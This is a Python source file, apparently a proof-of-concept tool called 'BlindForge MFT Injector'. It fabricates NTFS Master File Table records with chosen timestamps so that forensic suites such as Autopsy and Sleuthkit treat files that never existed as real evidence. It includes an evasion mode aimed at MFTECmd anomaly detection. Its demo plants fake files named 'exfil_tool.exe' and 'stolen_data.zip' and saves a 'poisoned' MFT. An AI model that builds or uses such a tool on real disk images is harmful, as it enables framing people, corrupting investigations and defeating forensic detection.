"""
BlindForge MFT Injector — Fabricate NTFS MFT entries for files that never existed.

Injects structurally valid FILE records into raw NTFS MFT, complete with
$STANDARD_INFORMATION and $FILE_NAME attributes bearing attacker-chosen
timestamps. Forensic tools (Autopsy, Sleuthkit, etc.) parse these as
legitimate file evidence.
"""

import struct
import os
import random
from datetime import datetime, timezone, timedelta
from typing import Optional

# NTFS epoch: 1601-01-01 00:00:00 UTC
NTFS_EPOCH = datetime(1601, 1, 1, tzinfo=timezone.utc)

# MFT record constants
MFT_RECORD_MAGIC = b"FILE"
MFT_RECORD_SIZE = 1024
ATTR_STANDARD_INFORMATION = 0x10
ATTR_FILE_NAME = 0x30
ATTR_DATA = 0x80
ATTR_END_MARKER = 0xFFFFFFFF
FILE_RECORD_IN_USE = 0x01
FILE_RECORD_IS_DIRECTORY = 0x02


def datetime_to_ntfs(dt: datetime, jitter_ns: bool = False) -> int:
    """Convert datetime to NTFS FILETIME (100ns intervals since 1601-01-01).
    If jitter_ns=True, adds realistic sub-100ns noise to avoid detection
    by tools like MFTECmd that flag zero-precision timestamps.
    """
    if dt.tzinfo is None:
        dt = dt.replace(tzinfo=timezone.utc)
    delta = dt - NTFS_EPOCH
    ft = int(delta.total_seconds() * 10_000_000)
    if jitter_ns:
        ft += random.randint(1000, 9999999)
    return ft


def ntfs_to_datetime(filetime: int) -> datetime:
    seconds = filetime / 10_000_000
    return NTFS_EPOCH + __import__("datetime").timedelta(seconds=seconds)


class MFTRecord:
    """Represents a single NTFS MFT FILE record."""

    def __init__(self, record_number: int):
        self.record_number = record_number
        self.sequence_number = 1
        self.flags = FILE_RECORD_IN_USE
        self.attributes: list[bytes] = []
        self.base_record_ref = 0
        self.next_attr_id = 0

    def add_standard_information(
        self,
        created: datetime,
        modified: datetime,
        mft_modified: datetime,
        accessed: datetime,
        file_attributes: int = 0x20,  # ARCHIVE
        usn: int = 0,
        security_id: int = 0x100,
        evasion: bool = False,
    ) -> None:
        """Build $STANDARD_INFORMATION attribute.
        With evasion=True, adds sub-second jitter and realistic USN/security_id
        to bypass MFTECmd/Timeline Explorer anomaly detection.
        """
        jitter = evasion
        ts_created = datetime_to_ntfs(created, jitter_ns=jitter)
        ts_modified = datetime_to_ntfs(modified, jitter_ns=jitter)
        ts_mft_modified = datetime_to_ntfs(mft_modified, jitter_ns=jitter)
        ts_accessed = datetime_to_ntfs(accessed, jitter_ns=jitter)

        if evasion and usn == 0:
            usn = random.randint(0x1000000, 0xFFFFFFF) * 8

        si_body = struct.pack(
            "<QQQQI",
            ts_created,
            ts_modified,
            ts_mft_modified,
            ts_accessed,
            file_attributes,
        )
        # Extended $SI fields (NTFS 3.0+): max_versions, version_number,
        # class_id, owner_id, security_id, quota_charged, usn
        si_body += struct.pack("<IIIIIQQ",
            0,              # max_versions
            0,              # version_number
            0,              # class_id
            0,              # owner_id
            security_id,    # security_id — MFTECmd parses this
            0,              # quota_charged
            usn,            # update_sequence_number — MFTECmd checks this
        )

        attr = self._make_resident_attr(ATTR_STANDARD_INFORMATION, si_body)
        self.attributes.append(attr)

    def add_file_name(
        self,
        parent_dir_record: int,
        filename: str,
        created: datetime,
        modified: datetime,
        mft_modified: datetime,
        accessed: datetime,
        logical_size: int = 0,
        allocated_size: int = 0,
        file_attributes: int = 0x20,
        namespace: int = 0x03,  # WIN32_AND_DOS
    ) -> None:
        ts_created = datetime_to_ntfs(created)
        ts_modified = datetime_to_ntfs(modified)
        ts_mft_modified = datetime_to_ntfs(mft_modified)
        ts_accessed = datetime_to_ntfs(accessed)

        filename_utf16 = filename.encode("utf-16-le")
        name_length = len(filename)

        # Parent directory reference (6 bytes record number + 2 bytes sequence)
        parent_ref = struct.pack("<IHH", parent_dir_record & 0xFFFFFFFF, 0, 1)

        fn_body = parent_ref + struct.pack(
            "<QQQQQQIIBB",
            ts_created,
            ts_modified,
            ts_mft_modified,
            ts_accessed,
            allocated_size,
            logical_size,
            file_attributes,
            0,  # reparse / ea
            name_length,
            namespace,
        )
        fn_body += filename_utf16

        attr = self._make_resident_attr(ATTR_FILE_NAME, fn_body)
        self.attributes.append(attr)

    def add_data_resident(self, content: bytes) -> None:
        attr = self._make_resident_attr(ATTR_DATA, content)
        self.attributes.append(attr)

    def add_data_nonresident(
        self,
        logical_size: int,
        allocated_size: int,
        start_vcn: int = 0,
        last_vcn: int = 0,
        run_list: bytes = b"\x00",
    ) -> None:
        attr_type = struct.pack("<I", ATTR_DATA)
        # Non-resident attribute header
        name_offset = 0x40
        flags = 0
        attr_id = self.next_attr_id
        self.next_attr_id += 1

        data_run_offset = 0x40
        compression_unit = 0

        body = struct.pack(
            "<QQHHHQQQ",
            start_vcn,
            last_vcn,
            data_run_offset,
            compression_unit,
            0,  # padding
            allocated_size,
            logical_size,
            logical_size,  # initialized size
        )
        body += run_list

        total_len = 0x40 + len(run_list)
        total_len = (total_len + 7) & ~7  # align to 8 bytes

        header = struct.pack(
            "<IIBBBH",
            ATTR_DATA,
            total_len,
            1,  # non-resident flag
            0,  # name_length
            0,  # name_offset
            flags,
        )
        header += struct.pack("<HI", attr_id, 0)  # attr_id + padding

        attr = header + body
        attr = attr.ljust(total_len, b"\x00")
        self.attributes.append(attr)

    def to_bytes(self) -> bytes:
        # Build attribute stream
        attr_stream = b""
        for attr in self.attributes:
            attr_stream += attr
        # End marker
        attr_stream += struct.pack("<I", ATTR_END_MARKER)
        attr_stream += b"\x00" * 4

        first_attr_offset = 0x38  # standard fixup offset for FILE records
        used_size = first_attr_offset + len(attr_stream)

        # FILE record header
        header = struct.pack(
            "<4sHHQHHHHIIIIHH",
            MFT_RECORD_MAGIC,      # signature
            0x30,                   # update sequence offset
            0x03,                   # update sequence count (1 + num sectors)
            0,                      # $LogFile sequence number
            self.sequence_number,   # sequence number
            0,                      # hard link count
            first_attr_offset,      # first attribute offset
            self.flags,             # flags
            used_size,              # used size
            MFT_RECORD_SIZE,        # allocated size
            self.base_record_ref,   # base record reference (lo)
            0,                      # base record reference (hi)
            0,                      # next attribute id
            0,                      # padding (XP alignment)
        )
        # MFT record number (at offset 0x2C in newer NTFS)
        header += struct.pack("<I", self.record_number)

        # Update sequence array (at offset 0x30): USN value + per-sector entries
        usn_value = 0x0001
        update_seq = struct.pack("<HHH", usn_value, usn_value, usn_value)

        record = header + update_seq
        record = record.ljust(first_attr_offset, b"\x00")
        record += attr_stream
        record = record.ljust(MFT_RECORD_SIZE, b"\x00")

        # Apply fixups: write USN value at last 2 bytes of each 512-byte sector
        record_ba = bytearray(record)
        for i in range(MFT_RECORD_SIZE // 512):
            offset = (i + 1) * 512 - 2
            record_ba[offset:offset + 2] = struct.pack("<H", usn_value)

        return bytes(record_ba)

    def _make_resident_attr(self, attr_type: int, body: bytes) -> bytes:
        attr_id = self.next_attr_id
        self.next_attr_id += 1

        body_len = len(body)
        body_offset = 0x18  # resident attribute header size
        total_len = body_offset + body_len
        total_len = (total_len + 7) & ~7  # align to 8 bytes

        header = struct.pack(
            "<IIBBBH",
            attr_type,
            total_len,
            0,  # resident
            0,  # name_length
            0,  # name_offset
            0,  # flags
        )
        header += struct.pack("<H", attr_id)
        # Resident-specific: content_length, content_offset
        header += struct.pack("<IH", body_len, body_offset)
        header += b"\x00" * 2  # padding

        attr = header + body
        attr = attr.ljust(total_len, b"\x00")
        return attr


class MFTInjector:
    """Inject fabricated FILE records into a raw NTFS MFT."""

    def __init__(self, mft_path: str):
        self.mft_path = mft_path
        self.mft_data: Optional[bytearray] = None

    def load(self) -> None:
        with open(self.mft_path, "rb") as f:
            self.mft_data = bytearray(f.read())

    def save(self, output_path: Optional[str] = None) -> str:
        path = output_path or self.mft_path
        with open(path, "wb") as f:
            f.write(self.mft_data)
        return path

    def get_record_count(self) -> int:
        return len(self.mft_data) // MFT_RECORD_SIZE

    def is_record_free(self, record_number: int) -> bool:
        offset = record_number * MFT_RECORD_SIZE
        if offset + MFT_RECORD_SIZE > len(self.mft_data):
            return False
        flags_offset = offset + 0x16
        flags = struct.unpack_from("<H", self.mft_data, flags_offset)[0]
        sig = self.mft_data[offset:offset + 4]
        return sig != MFT_RECORD_MAGIC or (flags & FILE_RECORD_IN_USE) == 0

    def find_free_records(self, count: int = 1) -> list[int]:
        free = []
        total = self.get_record_count()
        # Skip first 24 records (reserved system entries)
        for i in range(24, total):
            if self.is_record_free(i):
                free.append(i)
                if len(free) >= count:
                    break
        return free

    def inject_record(self, record: MFTRecord) -> int:
        record_bytes = record.to_bytes()
        offset = record.record_number * MFT_RECORD_SIZE

        if offset + MFT_RECORD_SIZE > len(self.mft_data):
            self.mft_data.extend(b"\x00" * (offset + MFT_RECORD_SIZE - len(self.mft_data)))

        self.mft_data[offset:offset + MFT_RECORD_SIZE] = record_bytes
        return record.record_number

    def inject_ghost_file(
        self,
        filename: str,
        parent_dir_record: int = 5,  # root directory
        created: Optional[datetime] = None,
        modified: Optional[datetime] = None,
        accessed: Optional[datetime] = None,
        content: bytes = b"",
        record_number: Optional[int] = None,
    ) -> int:
        """High-level: inject a complete ghost file entry into the MFT."""
        if record_number is None:
            free = self.find_free_records(1)
            if not free:
                raise RuntimeError("No free MFT records available")
            record_number = free[0]

        now = datetime.now(timezone.utc)
        created = created or now
        modified = modified or now
        accessed = accessed or now
        mft_modified = modified

        record = MFTRecord(record_number)
        record.add_standard_information(created, modified, mft_modified, accessed)
        record.add_file_name(
            parent_dir_record=parent_dir_record,
            filename=filename,
            created=created,
            modified=modified,
            mft_modified=mft_modified,
            accessed=accessed,
            logical_size=len(content),
            allocated_size=(len(content) + 4095) & ~4095 if content else 0,
        )

        if content and len(content) <= 700:
            record.add_data_resident(content)
        elif content:
            record.add_data_nonresident(
                logical_size=len(content),
                allocated_size=(len(content) + 4095) & ~4095,
            )

        self.inject_record(record)
        return record_number

    def inject_ghost_file_batch(
        self,
        files: list[dict],
        parent_dir_record: int = 5,
    ) -> list[int]:
        """Inject multiple ghost files at once.

        Each dict: {"filename": str, "created": datetime, "modified": datetime,
                     "accessed": datetime, "content": bytes}
        """
        free_records = self.find_free_records(len(files))
        if len(free_records) < len(files):
            raise RuntimeError(
                f"Need {len(files)} free records, found {len(free_records)}"
            )

        injected = []
        for i, file_spec in enumerate(files):
            rec_num = self.inject_ghost_file(
                filename=file_spec["filename"],
                parent_dir_record=parent_dir_record,
                created=file_spec.get("created"),
                modified=file_spec.get("modified"),
                accessed=file_spec.get("accessed"),
                content=file_spec.get("content", b""),
                record_number=free_records[i],
            )
            injected.append(rec_num)
        return injected


def create_empty_mft(record_count: int = 1024) -> bytearray:
    """Create a minimal empty MFT for testing."""
    mft = bytearray(record_count * MFT_RECORD_SIZE)
    # Mark first 24 records as system (in-use but empty)
    for i in range(24):
        offset = i * MFT_RECORD_SIZE
        mft[offset:offset + 4] = MFT_RECORD_MAGIC
        struct.pack_into("<H", mft, offset + 0x16, FILE_RECORD_IN_USE)
    return mft


if __name__ == "__main__":
    import sys
    import tempfile

    print("[BlindForge] MFT Injector — Ghost File Injection PoC")
    print("=" * 60)

    # Create a test MFT
    test_mft = create_empty_mft(256)
    mft_path = os.path.join(tempfile.gettempdir(), "test_mft.bin")
    with open(mft_path, "wb") as f:
        f.write(test_mft)

    injector = MFTInjector(mft_path)
    injector.load()

    print(f"[*] MFT loaded: {injector.get_record_count()} records")
    print(f"[*] Free records available: {len(injector.find_free_records(100))}")

    # Inject ghost files
    ghost_files = [
        {
            "filename": "confidential_report.docx",
            "created": datetime(2026, 6, 15, 14, 30, 0, tzinfo=timezone.utc),
            "modified": datetime(2026, 6, 15, 16, 45, 0, tzinfo=timezone.utc),
            "accessed": datetime(2026, 6, 16, 9, 0, 0, tzinfo=timezone.utc),
            "content": b"PK\x03\x04" + b"\x00" * 100,  # fake docx header
        },
        {
            "filename": "exfil_tool.exe",
            "created": datetime(2026, 6, 14, 2, 0, 0, tzinfo=timezone.utc),
            "modified": datetime(2026, 6, 14, 2, 0, 0, tzinfo=timezone.utc),
            "accessed": datetime(2026, 6, 15, 14, 30, 0, tzinfo=timezone.utc),
            "content": b"MZ" + b"\x00" * 50,  # fake PE header
        },
        {
            "filename": "stolen_data.zip",
            "created": datetime(2026, 6, 15, 16, 50, 0, tzinfo=timezone.utc),
            "modified": datetime(2026, 6, 15, 16, 55, 0, tzinfo=timezone.utc),
            "accessed": datetime(2026, 6, 15, 17, 0, 0, tzinfo=timezone.utc),
            "content": b"PK\x05\x06" + b"\x00" * 80,
        },
    ]

    records = injector.inject_ghost_file_batch(ghost_files)
    output_path = injector.save(mft_path + ".poisoned")

    print(f"\n[+] Injected {len(records)} ghost files:")
    for i, rec in enumerate(records):
        print(f"    Record #{rec}: {ghost_files[i]['filename']}")
        print(f"      Created:  {ghost_files[i]['created']}")
        print(f"      Modified: {ghost_files[i]['modified']}")
        print(f"      Accessed: {ghost_files[i]['accessed']}")

    print(f"\n[+] Poisoned MFT saved to: {output_path}")
    print(f"[+] Feed to Autopsy/Sleuthkit — ghost files appear as real evidence")
    print("\n[!] These files never existed. The forensic tool cannot tell.")
